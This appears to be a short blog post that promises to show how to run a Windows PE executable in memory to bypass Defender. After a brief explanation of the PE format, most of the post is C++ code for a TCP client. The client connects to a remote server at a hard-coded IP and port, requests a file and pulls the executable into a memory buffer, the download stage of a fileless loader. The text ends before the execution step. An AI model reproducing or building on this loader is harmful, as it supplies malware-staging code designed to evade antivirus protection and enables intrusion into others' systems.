---
title: Remote Run PE 
layout: post
---

## Intro

Hi , today I will tell you how we can execute PE in memory and how we can bypass defender by using this 

## What is PE ?

PE (Portable Executable) is an executable and object file format used in Windows family operating systems such as Windows NT, Windows 2000, Windows XP, Windows 7, Windows 10, and others.

PE files include executable files (usually with the .exe extension), dynamic libraries (DLLs), and other file types that can be run on the Windows platform. The PE format was introduced in Windows NT and replaced the older NE (New Executable) format used in earlier versions of the operating system.

In brief, a PE file is an executable file format such as .exe (executable programs) and .dll (dynamic libraries) used in Windows operating systems.

You can read more here https://0xrick.github.io/win-internals/pe2/

## How to run PE in memory ?

In order to run a PE file, first of all it must be received, in our case we will receive the file using tcp and store this buffer in memory.

In my example, when connecting to the server, it asks to get the file size to increase the buffer, then the client sends a start command to get the file. After the server sends the file, we save it to the buffer as vector<char>. 

```cpp
printf("[+] Connecting!\n");

//Initialize tcp client class 
TCPClient tcpClient;

//Receiving buffer
std::vector<char> recvBuff;
int iResult;

//Value to check correct actions
BOOL bConnResult;
BOOL bSendResult;

// Contecting to server
bConnResult = tcpClient.connectToServer("192.168.222.128", 4443);;
if (!bConnResult) {
	return CONNECTION_ERROR;
}

printf("[+] Connected!\n");
printf("[+] Send command to get file size!\n");

// Send to the server to get file size
bSendResult = tcpClient.sendToServer("GetFileSize");
if (!bSendResult) {
	return SENDING_ERROR;
}

// validation
iResult = tcpClient.reciveData();
if (iResult <= 0) {
	return RECIVE_DATE_ERROR;
}

// Getting received buffer 
recvBuff = tcpClient.getBuffer();

// vector<char> to string 
std::string sFileLength(recvBuff.begin(), recvBuff.end());
printf("[+] Received data: %s\n", sFileLength.c_str());

// str to int 
int iFileLength = std::stoi(sFileLength);

// Change the buffer length for the received data  
tcpClient.setBufLen(iFileLength);

printf("[+] Send command to load PE!\n");

//Send to the server for load PE in memory
bSendResult = tcpClient.sendToServer("start");
if (!bSendResult) {
	return SENDING_ERROR;
}

//We use delay to make sure the server sends the whole file.
Sleep(1000 * 5);

// Getting data
iResult = tcpClient.reciveData();
if (iResult <= 0 ) {
	return RECIVE_DATE_ERROR;
}

// save to our buffer 
recvBuff = tcpClient.getBuffer();
printf("[+] Received data: %.*s\n", iResult, recvBuff.data());
```











